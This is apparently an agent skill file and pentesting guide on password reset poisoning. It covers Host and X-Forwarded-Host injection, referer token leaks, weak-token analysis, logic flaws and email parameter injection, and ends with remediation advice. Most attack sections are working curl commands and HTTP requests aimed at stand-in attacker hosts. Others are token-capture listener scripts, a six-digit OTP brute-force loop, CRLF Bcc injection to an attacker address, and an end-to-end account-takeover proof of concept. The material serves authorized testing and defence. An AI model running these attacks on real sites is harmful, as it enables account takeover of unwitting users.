---
name: password-reset-poisoning
description: Password reset poisoning and token leak testing - host header injection, X-Forwarded-Host, referer leakage, predictable tokens, and reset logic flaws for authorized penetration testing.
---

# Password Reset Poisoning & Token Leak Testing

## 1) Overview & Impact

Password reset poisoning is a class of vulnerabilities where an attacker manipulates
the password reset flow so that the reset link (containing the secret token) is
delivered to an attacker-controlled destination instead of — or in addition to — the
legitimate user's inbox. Because the reset link implicitly authenticates the holder,
capturing it yields a full **account takeover (ATO)** without needing the victim's
password.

Impact chain: attacker triggers reset for `victim@corp.com` → server builds the reset
URL using attacker-influenced input (Host header etc.) → email with
`https://evil.com/reset?token=<SECRET>` goes to the victim → victim clicks (or a
mail link-preview bot pre-fetches) → token lands on the attacker's server → attacker
visits the real reset URL with the stolen token → sets a new password → **ATO**.

Why it matters:
- Full compromise of the victim account; often chains into MFA bypass (reset flows
  frequently skip or reset MFA).
- Zero user interaction may be required if mail-provider link-preview bots
  (Outlook/GoogleSafeLinks crawlers) fetch the poisoned URL.
- Frequently rated **High → Critical** depending on target account privilege.

Scope guard: only test accounts you own or are explicitly authorized to test
(in-scope test tenants, your own registered accounts, or designated lab victims).

## 2) Recon

### 2.1 Find the reset endpoints

```bash
# Directory/endpoint discovery + common reset paths
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -mc 200,302 -fc 404 -t 40
for p in forgot-password forgot reset-password password-reset reset account/recover \
         users/password/reset api/v1/password/forgot auth/reset; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' https://target.com/$p)  /$p"
done
```

Also inspect: login page HTML (`grep -i "forgot\|reset" login.html`), JS bundles
(`grep -oE '"/[a-z0-9_/-]*(reset|forgot|recover)[a-z0-9_/-]*"' app.js`), API docs at
`/swagger.json`, `/api-docs`, GraphQL introspection, and mobile app traffic via
mitmproxy — mobile clients often expose reset APIs the web app does not.

### 2.2 Analyze the reset email

Register a test account with an inbox you control. Trigger a reset and study the email:

```bash
# Local lab: run MailHog and inspect raw MIME (Source tab = full headers + body)
docker run -d -p 8025:8025 -p 1025:1025 mailhog/mailhog   # app SMTP -> localhost:1025
# Entropy estimates
python3 -c "import math; print(math.log2(16**32), 'bits')"   # 32-char hex: 128 bits = good
python3 -c "import math; print(math.log2(10**6), 'bits')"    # 6-digit numeric: ~20 bits = weak
```

Record: exact reset URL structure (absolute vs relative, which domain is embedded),
token location (query string / path segment / POST body), token format (hex, base64,
UUID, numeric), entropy `log2(charset^length)`, expiry wording (verify empirically),
and email headers (`X-Mailer`, template fingerprints, DKIM/SPF). Note any secondary
links (tracking pixels, "view in browser" mirrors) — each is a potential leak vector.

## 3) Host Header Injection

The classic poisoning primitive: the app builds the reset link using the request's
`Host` header (or a proxy-derived header) instead of a configured base URL.

### 3.1 Baseline

```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com
```

Baseline email contains `https://target.com/reset?token=...`.

### 3.2 Direct Host header injection

```http
POST /forgot-password HTTP/1.1
Host: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com
```

If the email now contains `https://evil-attacker.com/reset?token=...` → vulnerable.

### 3.3 Proxy-derived header variants

Many stacks ignore `Host` but trust forwarding headers set by reverse proxies:

```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com
```

Iterate through the header family — test each one individually:

```http
X-Forwarded-Host: evil-attacker.com
X-Host: evil-attacker.com
X-Forwarded-Server: evil-attacker.com
X-Forwarded-Proto: https
X-Original-Host: evil-attacker.com
Forwarded: host=evil-attacker.com
X-HTTP-Host-Override: evil-attacker.com
```

Automated sweep:

```bash
for h in "Host" "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" \
         "X-Original-Host" "X-HTTP-Host-Override"; do
  curl -s -X POST https://target.com/forgot-password \
    -H "$h: evil-attacker.com" \
    -H "X-Forwarded-Proto: https" \
    -d "email=your-test-account@corp.com" -o /dev/null -w "$h -> %{http_code}\n"
  # then check the received email's reset URL domain
done
```

### 3.4 Capture infrastructure

Use Burp Collaborator, or self-host a listener that logs full requests:

```bash
# Simple capture server (logs path + headers, returns 200)
python3 - <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[HIT] {self.path}\n{self.headers}")
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    do_POST = do_GET
HTTPServer(("0.0.0.0", 80), H).serve_forever()
EOF

# Or use interactsh (no public IP needed)
interactsh-client -v   # yields oast.fun subdomains to inject as the Host value
```

### 3.5 Documenting the flow

Capture evidence at each stage (screenshots or saved raw exchanges):
1. The poisoned request in Burp Repeater (headers + body).
2. The received email showing the attacker-domain reset URL (MailHog source view).
3. The hit on your Collaborator/interactsh dashboard showing the token in the path.
4. The successful password change using the captured token on the *legitimate* domain.

> Tip: some apps validate the Host against an allowlist but still trust
> `X-Forwarded-Host`. Others only poison when `Host` and `X-Forwarded-Host`
> disagree — test combinations, not just single headers.

## 4) Referer Leakage

If the reset page loads third-party resources (analytics, CDN, ads, a "help" link to
an external site) and does not set a Referrer-Policy, the browser sends the full URL
— **including the token** — in the `Referer` header.

Attack flow:
1. Attacker sends victim a link to `https://evil.com/phish` styled as a help page.
2. Victim, having just requested a reset, is on `https://target.com/reset?token=SECRET`.
3. Victim clicks the attacker's link from that page (or the page auto-loads an
   external resource).
4. `Referer: https://target.com/reset?token=SECRET` arrives at attacker's server.

```bash
# Attacker-side capture of Referer
python3 - <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("REFERER:", self.headers.get("Referer"))
        self.send_response(200); self.end_headers()
        self.wfile.write(b"<h1>Support</h1>")
HTTPServer(("0.0.0.0", 80), H).serve_forever()
EOF
```

Test for the preconditions:

```bash
# Does the reset page leak its full URL to external origins?
curl -sI https://target.com/reset | grep -i referrer-policy
# Missing or permissive values (no-referrer-when-downgrade, origin-when-cross-origin,
# unsafe-url) mean the full URL (incl. query string) may be sent cross-origin.
```

Also check whether the reset page loads any cross-origin `<img>`, `<script>`, or
`fetch()` — those requests carry the Referer too, so a third-party analytics host
becomes a token leak sink.

## 5) Predictable & Weak Tokens

Collect several tokens (reset your own account repeatedly) and analyze:

```bash
# Collect 10 tokens by repeatedly resetting your own account, then:
cat tokens.txt | head -5
# Check for sequential patterns / timestamps
python3 - <<'EOF'
import base64, hashlib, time, re
toks = open("tokens.txt").read().split()
for t in toks:
    try:
        b = base64.b64decode(t + "=" * (-len(t) % 4))
        print(t, "->", b.hex(), len(b), "bytes")
    except Exception:
        pass
# Try md5(username + date) style derivations
user, date = "victim", "2024-01-01"
for combo in [user+date, date+user, user+date.replace("-","")]:
    print(combo, hashlib.md5(combo.encode()).hexdigest())
EOF
```

Weakness classes to test:

| Weakness | Test |
|---|---|
| Timestamp-based | Token ≈ unix epoch / ms; try `int(time.time())` ± drift |
| Sequential / DB id | Request two resets, compare numeric deltas |
| md5/sha1 of username+date | Hash candidate strings and compare |
| Short numeric OTP | 4–6 digits → brute force the reset endpoint |
| Token reuse | Request reset twice — same token both times? |
| No expiry | Use a token 48h+ after issuance |
| Hashed-but-guessable | `md5(email)`, `sha1(user+salt-less)` |
| Encoded timestamps | Base64/hex decode reveals embedded epoch |

Brute-forcing a short OTP (lab only):

```bash
for code in $(seq 100000 999999); do
  r=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/reset \
      -d "token=$code&password=NewPass123!")
  [ "$r" = "302" ] && { echo "VALID: $code"; break; }
done
```

## 6) Token-in-URL Handling

Even with a strong token, placement in the URL creates passive leak channels:

1. **Server/proxy logs** — access logs, WAF logs, APM traces record full query strings.
2. **Browser history** — token persists on shared/synced devices.
3. **Referer headers** — see §4.
4. **Link-preview bots** — email security gateways and mail clients prefetch URLs,
   consuming or exposing single-use tokens (also breaks legit resets).
5. **Shared "copy link" flows** — users paste reset URLs into chats/tickets.

```bash
# Check whether GET is accepted for the reset submission (token in query string)
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://target.com/reset?token=CAPTURED_TOKEN&password=NewPass123!"

# Check if the token survives in logs by looking for your canary value in any
# exposed log/debug endpoint or error pages during testing.
```

Assess: is the token accepted via GET (state-changing action via GET = CSRF +
logging risk)? Is the token invalidated immediately after a successful GET-based
reset?

## 7) Logic Flaws

### 7.1 Password change for a different account (PortSwigger "broken logic")

Classic flaw: the reset form POSTs the username/email alongside the new password,
and the server trusts the client-supplied identity instead of the token's owner.

```http
POST /forgot-password?user=victim@corp.com HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user=victim@corp.com            ← server emails token to victim (you never need it)
```

Then on the reset submission endpoint, swap the identity parameter to YOUR account:

```http
POST /reset HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user=attacker@evil.com&token=YOUR_OWN_VALID_TOKEN&password=Pwned123!
```

If the server sets victim's password using your token → critical logic flaw.

### 7.2 User enumeration via differing responses

```bash
curl -s -X POST https://target.com/forgot-password -d "email=real@corp.com" | grep -i "email sent"
curl -s -X POST https://target.com/forgot-password -d "email=nobody@corp.com" | grep -i "not found"
# Different body, timing, or status code = enumeration oracle
```

Also compare response times (`-w "%{time_total}"`) and check whether the "reset
email sent" page differs in length (`wc -c`).

### 7.3 Token not tied to account

Request a token for your account, then use it against victim's reset endpoint:

```bash
curl -X POST https://target.com/reset \
  -d "token=MY_TOKEN&user=victim@corp.com&password=Pwned123!"
```

### 7.4 Non-single-use tokens

Reuse the same token after a successful reset. If it still works, any prior leak
(e.g., via logs) grants persistent access.

### 7.5 Response leaking the token

```bash
curl -s -X POST https://target.com/forgot-password -d "email=victim@corp.com" -i
# Look for token in response body/headers (some dev builds return it "for testing")
```

### 7.6 Race conditions

Two parallel submissions may double-consume or bypass single-use checks:

```bash
printf 'POST /reset HTTP/1.1\r\nHost: target.com\r\n...' > req.txt
# Send identical requests simultaneously with Burp Turbo Intruder or:
for i in $(seq 1 20); do curl -s -o /dev/null -X POST https://target.com/reset \
  -d "token=T&password=Pwned123!" & done; wait
```

## 8) API Response Token Leak

Mobile/SPA backends sometimes return the reset token directly:

```bash
curl -s -X POST https://target.com/api/v1/password/forgot \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@corp.com"}' | jq .
# Watch for: {"success":true,"reset_token":"a1b2c3..."} or a "debug" field
```

IDOR on reset-related endpoints:

```bash
# Reset-request objects readable by id?
curl -s https://target.com/api/v1/reset-requests/1001 -H "Authorization: Bearer $MYTOKEN"
# Iterate ids 1000..1010 looking for other users' tokens/statuses

# Password change endpoint missing object-level authz?
curl -s -X POST https://target.com/api/v1/users/1001/password \
  -H "Authorization: Bearer $MYTOKEN" -d '{"password":"Pwned123!"}'
```

Also test GraphQL if present:

```bash
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ user(email:\"victim@corp.com\"){ id resetToken } }"}'
```

## 9) Email Parameter Injection

If the reset endpoint accepts multiple email-ish parameters or fails to sanitize,
you may redirect or duplicate the email:

```http
POST /forgot-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com%20cc:attacker@evil.com
```

Variants to try:

```bash
# Extra recipient via header injection characters
email=victim@corp.com%0d%0aCc:attacker@evil.com
email=victim@corp.com%0ABcc:attacker@evil.com
# Duplicate parameters (server/parser disagreement)
email=victim@corp.com&email=attacker@evil.com
# Array notation
email[]=victim@corp.com&email[]=attacker@evil.com
# Separate cc/bcc fields some apps map into mail headers
email=victim@corp.com&cc=attacker@evil.com&bcc=attacker@evil.com
```

CRLF injection into the email field can inject arbitrary SMTP headers (`Cc:`,
`Bcc:`, even a second body) if the value reaches the mail library unsanitized.
Confirm by checking MailHog for an email delivered to the attacker address.

## 10) Verification Methodology (End-to-End PoC)

Full walkthrough for an authorized target with a controlled inbox:

```bash
# Step 1 — Start capture infrastructure
interactsh-client &            # note your oast domain: xxxx.oast.fun

# Step 2 — Confirm baseline reset email for your own account
curl -s -X POST https://target.com/forgot-password \
  -d "email=pentest+1@yourcorp.com" -o /dev/null -w "%{http_code}\n"
# Check inbox: record exact URL + token format

# Step 3 — Test Host header poisoning variants (loop from §3.3), checking email each time

# Step 4 — When a variant yields an attacker-domain URL, trigger for the AUTHORIZED victim account
curl -s -X POST https://target.com/forgot-password \
  -H "X-Forwarded-Host: xxxx.oast.fun" \
  -d "email=victim@corp.com" -o /dev/null -w "%{http_code}\n"

# Step 5 — Watch for the hit containing the token
# interactsh output: [HTTP] xxxx.oast.fun/reset?token=SECRET from 1.2.3.4

# Step 6 — Prove exploitation: use the stolen token against the REAL host
curl -s -X POST https://target.com/reset \
  -d "token=SECRET&password=NewP@ss123!" -o /dev/null -w "%{http_code}\n"

# Step 7 — Prove ATO: log in as the victim with the new password (lab account)
curl -s -X POST https://target.com/login \
  -d "email=victim@corp.com&password=NewP@ss123!" -c cookies.txt -i | head -5
```

Evidence bundle per finding: raw request (Burp), raw email source, capture-server
log line with token, successful reset response, login confirmation screenshot.

## 11) Lab / Homelab

Practice legally on PortSwigger Web Security Academy (free, intentionally vulnerable):

| Lab | Skill practiced |
|---|---|
| Password reset broken logic | §7.1 identity-parameter swap |
| Password reset poisoning via middleware | §3.3 X-Forwarded-Host chain |
| Flawed brute force protection / 2-broken brute-force | §5 OTP rate-limit bypass |
| Email enumeration via differing responses | §7.2 |

Local lab recipe:

```bash
# MailHog + a deliberately vulnerable Flask app pattern
docker run -d --name mailhog -p 8025:8025 -p 1025:1025 mailhog/mailhog
# App misconfiguration that reproduces poisoning:
#   reset_url = request.host_url + f"/reset?token={token}"   # ← trusts Host header
# Fix pattern:
#   reset_url = app.config["BASE_URL"] + f"/reset?token={token}"
```

## 12) Reporting

**Severity guidance**
- Host-header poisoning with confirmed token capture + ATO: **Critical** (CVSS ~9.1)
- Referer leakage of active token: **High**
- Predictable/non-expiring/reusable tokens: **High**
- User enumeration alone: **Low/Medium**
- Token in JSON response (internal API): **High** if externally reachable

**Evidence checklist**
- [ ] Raw HTTP request demonstrating the injection (exact headers/body)
- [ ] Raw email source showing attacker-controlled URL (redact real victim data)
- [ ] Capture log/Collaborator interaction showing the token received
- [ ] Successful password-change request using the captured token
- [ ] Login proof (redacted) confirming ATO
- [ ] Timestamps and scope authorization reference
- [ ] Remediation retest plan

Write-up structure: Summary → Impact → Steps to Reproduce (numbered, copy-pasteable)
→ Evidence → Root cause hypothesis → Remediation → Retest notes.

## 13) Remediation

1. **Build URLs server-side from configuration** — never from `Host`,
   `X-Forwarded-*`, or any client-supplied header:
   ```python
   RESET_BASE = app.config["BASE_URL"]          # e.g. https://target.com
   link = f"{RESET_BASE}/reset?token={token}"
   ```
   At the proxy layer, strip/overwrite client-supplied `X-Forwarded-*` headers and
   pin `Host` to the expected vhost.
2. **Tokens**: ≥256 bits from a CSPRNG (`secrets.token_urlsafe(32)`), no user/time
   derivation, no encoding of internal state.
3. **Expiry**: 15 minutes maximum; store hashed tokens server-side (like passwords).
4. **Single use**: atomically invalidate on first use (DB conditional update:
   `UPDATE tokens SET used=1 WHERE token_hash=? AND used=0 AND expires_at>NOW()`).
5. **Tie token to account**: bind token ↔ user ID server-side; never accept the
   identity from client input on the reset submission.
6. **Invalidate old tokens** on each new request and on password change; revoke all
   sessions after reset.
7. **Uniform responses**: identical body/status/timing whether or not the account
   exists; constant-time comparisons.
8. **Never return tokens** in API responses, logs, or debug output.
9. **Headers on the reset page**:
   ```http
   Referrer-Policy: no-referrer
   Content-Security-Policy: ... (restrict third-party origins)
   Cache-Control: no-store
   ```
10. **Rate limiting + monitoring** on reset endpoints; alert on anomalous reset volume
    per account/IP and on outbound mail to unexpected domains.
